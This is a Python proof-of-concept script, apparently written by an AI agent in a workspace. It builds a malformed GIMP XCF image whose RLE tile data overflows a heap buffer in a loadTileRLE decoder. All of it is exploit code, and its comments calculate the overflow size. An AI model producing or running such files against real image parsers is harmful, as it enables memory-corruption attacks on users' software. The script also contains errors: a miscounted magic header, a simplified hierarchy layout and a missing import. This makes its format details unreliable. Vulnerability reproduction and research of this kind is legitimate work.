def create_xcf_poc():
    """Create a minimal XCF file that triggers heap buffer overflow in loadTileRLE"""
    
    # XCF file format (big-endian):
    # - Magic: "gimp xcf file" + "v001" (14 bytes)
    # - Width (4 bytes), Height (4 bytes), Type (4 bytes)
    # - Properties (PROP_COMPRESSION = 17, value = 1 for RLE)
    # - Layer offsets (terminated by 0)
    # - Layer data
    
    data = b""
    
    # Magic
    data += b"gimp xcf file\x00v001"  # 14 bytes
    
    # Image dimensions and type
    data += struct.pack(">I", 64)   # width
    data += struct.pack(">I", 64)   # height
    data += struct.pack(">I", 0)    # type = RGB
    
    # Image properties
    # PROP_COMPRESSION = 17
    data += struct.pack(">I", 17)   # prop_type
    data += struct.pack(">I", 4)    # prop_size
    data += struct.pack(">I", 1)    # COMPRESS_RLE
    
    # PROP_END = 0
    data += struct.pack(">I", 0)    # prop_type (PROP_END)
    data += struct.pack(">I", 0)    # prop_size
    
    # Layer offsets (we'll have one layer)
    # The layer offset will point to right after the layer offsets section
    layer_offset = len(data) + 4 + 4  # +4 for the layer offset itself, +4 for the terminating 0
    
    # Actually, let me calculate more carefully
    # After the properties, we have layer offsets
    # Each layer offset is 4 bytes, terminated by 0
    
    # Let me just put the layer offset here
    data += struct.pack(">I", layer_offset)
    data += struct.pack(">I", 0)  # terminator
    
    # Now the layer data at layer_offset
    # Layer format:
    # - width (4 bytes)
    # - height (4 bytes)
    # - type (4 bytes) - RGB_GIMAGE = 0
    # - name (null-terminated string)
    # - hierarchy_offset (4 bytes)
    # - mask_offset (4 bytes) - 0 for no mask
    # - Layer properties
    # - PROP_END
    
    # Layer header
    data += struct.pack(">I", 64)   # layer width
    data += struct.pack(">I", 64)   # layer height
    data += struct.pack(">I", 0)    # layer type = RGB_GIMAGE
    
    # Layer name
    name = b"layer1\x00"
    data += name
    
    # Hierarchy offset - will point to after layer properties
    hierarchy_offset_pos = len(data)
    data += struct.pack(">I", 0)  # placeholder for hierarchy_offset
    
    # Mask offset
    data += struct.pack(">I", 0)  # no mask
    
    # Layer properties
    # PROP_OPACITY = 6
    data += struct.pack(">I", 6)    # prop_type
    data += struct.pack(">I", 4)    # prop_size
    data += struct.pack(">I", 255)  # opacity
    
    # PROP_VISIBLE = 8
    data += struct.pack(">I", 8)    # prop_type
    data += struct.pack(">I", 4)    # prop_size
    data += struct.pack(">I", 1)    # visible
    
    # PROP_END = 0
    data += struct.pack(">I", 0)    # prop_type
    data += struct.pack(">I", 0)    # prop_size
    
    # Now update the hierarchy_offset
    hierarchy_offset = len(data)
    data_bytes = bytearray(data)
    struct.pack_into(">I", data_bytes, hierarchy_offset_pos, hierarchy_offset)
    data = bytes(data_bytes)
    
    # Hierarchy data
    # - width (4 bytes)
    # - height (4 bytes)
    # - bpp (4 bytes) - 3 for RGB
    # - offset (4 bytes) - offset to tile data
    
    tile_data_offset_pos = len(data) + 12  # after width, height, bpp
    data += struct.pack(">I", 64)   # width
    data += struct.pack(">I", 64)   # height
    data += struct.pack(">I", 3)    # bpp = 3 (RGB) - this causes overflow!
    data += struct.pack(">I", 0)    # placeholder for tile data offset
    
    # Tile data offset
    tile_data_offset = len(data)
    data_bytes = bytearray(data)
    struct.pack_into(">I", data_bytes, tile_data_offset_pos, tile_data_offset)
    data = bytes(data_bytes)
    
    # Now the tile data
    # For RLE encoding, we need to provide data that will be decoded
    # The tile data format:
    # For each bpp channel (3 channels for RGB):
    #   RLE encoded data for image_size pixels
    #
    # RLE encoding:
    # - If byte < 128: literal run of (byte+1) pixels
    # - If byte >= 128: repeated run of (257-byte) pixels
    # - If byte == 128: extended length (next 2 bytes are length)
    #
    # We need to write 64*64 = 4096 pixels per channel, 3 channels
    # Total pixels to write: 3 * 4096 = 12288
    # Each pixel is sizeof(QRgb) = 4 bytes in the tile buffer
    # Total bytes written: 12288 * 4 = 49152
    # Tile buffer size: 64*64*4 = 16384
    # Overflow: 49152 - 16384 = 32768 bytes
    
    # Let's create RLE data that decodes to 4096 pixels per channel
    # We'll use a simple repeated run for each channel
    
    rle_data = b""
    
    for channel in range(3):
        # Use a repeated run of 128 pixels (max for single-byte encoding)
        # 257 - 128 = 129, so byte value 129 means 128 repetitions
        remaining = 4096
        while remaining > 0:
            if remaining >= 128:
                # Repeated run of 128 pixels
                rle_data += struct.pack("B", 129)  # 257 - 128 = 129
                rle_data += struct.pack("B", channel)  # pixel value
                remaining -= 128
            else:
                # Repeated run of remaining pixels
                rle_data += struct.pack("B", 257 - remaining)
                rle_data += struct.pack("B", channel)
                remaining = 0
    
    data += rle_data
    
    with open("/workspace/poc.xcf", "wb") as f:
        f.write(data)
    
    print(f"PoC file created: {len(data)} bytes")
    print(f"RLE data: {len(rle_data)} bytes")
    print(f"Expected tile buffer writes: {3 * 64 * 64 * 4} bytes")
    print(f"Tile buffer size: {64 * 64 * 4} bytes")

create_xcf_poc()
